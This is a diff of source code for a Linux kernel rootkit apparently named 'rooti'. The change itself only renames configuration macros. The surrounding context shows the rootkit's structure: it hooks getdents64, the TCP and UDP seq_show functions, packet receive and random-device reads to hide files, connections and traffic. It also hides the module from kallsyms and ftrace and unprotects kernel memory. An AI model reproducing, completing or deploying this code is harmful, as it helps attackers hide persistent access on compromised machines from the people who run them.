@@ -22,11 +22,11 @@
 #include "utils.h"
 #include "config.h"
 
-#ifndef ROOTI_DEBUG_SHOWME
+#ifndef ROOTI_DEBUG_SHOW_ME
 #include "capabilities/hiding/module.h"
 #endif
 
-#ifdef ROOTI_PCAP_FILTER_METHOD_PROG
+#ifdef ROOTI_CONFIG_PCAP_FILTER_METHOD_PROG
 #include "capabilities/hiding/net.h"
 #endif
 
@@ -55,7 +55,7 @@ static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
 static int (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
 static int (*orig_udp4_seq_show)(struct seq_file *seq, void *v);
 
-#ifndef ROOTI_PCAP_FILTER_METHOD_PROG
+#ifndef ROOTI_CONFIG_PCAP_FILTER_METHOD_PROG
 static int (*orig_packet_rcv)(struct sk_buff *skb, struct net_device *dev,
                               struct packet_type *pt, struct net_device *orig_dev);
 static int (*orig_tpacket_rcv)(struct sk_buff *skb, struct net_device *dev,
@@ -69,7 +69,7 @@ static ssize_t (*orig_random_read_iter)(struct kiocb *kiocb, struct iov_iter *it
 static ssize_t (*orig_urandom_read_iter)(struct kiocb *kiocb, struct iov_iter *iter);
 static void (*orig_do_exit)(long code);
 
-#ifndef ROOTI_DEBUG_SHOWME
+#ifndef ROOTI_DEBUG_SHOW_ME
 static int (*orig_kallsyms_seq_show)(struct seq_file *m, void *p);
 static int (*orig_ftrace_seq_show)(struct seq_file *m, void *v);
 #endif
@@ -175,7 +175,7 @@ static int hook_udp4_seq_show(struct seq_file *seq, void *v)
     return orig_udp4_seq_show(seq, v);
 }
 
-#ifndef ROOTI_PCAP_FILTER_METHOD_PROG
+#ifndef ROOTI_CONFIG_PCAP_FILTER_METHOD_PROG
 
 static int hook_packet_rcv(struct sk_buff *skb, struct net_device *dev,
                            struct packet_type *pt, struct net_device *orig_dev)
@@ -355,7 +355,7 @@ static ssize_t hook_random_read_iter(struct kiocb *kiocb, struct iov_iter *iter)
     return len;
 }
 
-#ifndef ROOTI_DEBUG_SHOWME
+#ifndef ROOTI_DEBUG_SHOW_ME
 static int hook_kallsyms_seq_show(struct seq_file *m, void *p)
 {
     // Copied from kernel
@@ -440,7 +440,7 @@ struct rooti_func_hook rooti_func_hooks[] = {
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_getdents64"), hook_getdents64, &orig_getdents64),
     ROOTI_FUNC_HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
     ROOTI_FUNC_HOOK("udp4_seq_show", hook_udp4_seq_show, &orig_udp4_seq_show),
-#ifndef ROOTI_PCAP_FILTER_METHOD_PROG
+#ifndef ROOTI_CONFIG_PCAP_FILTER_METHOD_PROG
     ROOTI_FUNC_HOOK("packet_rcv", hook_packet_rcv, &orig_packet_rcv),
     ROOTI_FUNC_HOOK("tpacket_rcv", hook_tpacket_rcv, &orig_tpacket_rcv),
 #else
@@ -488,7 +488,7 @@ static int __init rooti_init(void)
         goto error_install_fw_hooks;
     }
 
-#ifndef ROOTI_DEBUG_SHOWME
+#ifndef ROOTI_DEBUG_SHOW_ME
     rooti_hideme();
 
     orig_kallsyms_seq_show = rooti_sym_repo.kallsyms_op->show;
@@ -512,7 +512,7 @@ error_install_func_hooks:
 
 static void __exit rooti_exit(void)
 {
-#ifndef ROOTI_DEBUG_SHOWME
+#ifndef ROOTI_DEBUG_SHOW_ME
     rooti_unprotect_memory();
     rooti_sym_repo.kallsyms_op->show = orig_kallsyms_seq_show;
     rooti_sym_repo.show_ftrace_seq_ops->show = orig_ftrace_seq_show;
